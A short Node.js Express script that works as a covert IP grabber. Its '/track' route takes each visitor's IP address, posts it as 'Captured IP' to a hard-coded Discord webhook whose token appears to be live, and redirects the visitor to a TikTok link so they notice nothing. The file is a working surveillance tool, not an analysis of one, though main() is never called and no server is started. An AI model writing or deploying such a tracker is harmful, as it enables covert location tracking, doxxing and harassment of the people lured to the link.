const express = require('express');
const app = express();

async function sendCapturedIp(webhookUrl, viewerIp) {
    const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: `Captured IP: ${viewerIp}`
        })
    });

    if (!response.ok) {
        throw new Error(`Webhook request failed: ${response.status}`);
    }
}

async function main() {
    app.get('/track', (req, res) => {
        const viewerIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        sendCapturedIp(
            "https://discord.com/api/webhooks/1541943235667169310/7Ajw5PGih26r0ZVH3I4VOSQeEUg0fDYuIXXydo4FuI2FEZrNJdFX6aH4iePAzgRK6Doa",
            viewerIp
        ).catch(console.error);

        // Redirect the user to a normal website
        res.redirect('https://www.tiktok.com/t/ZTA6h7Rft/');
    });    
}
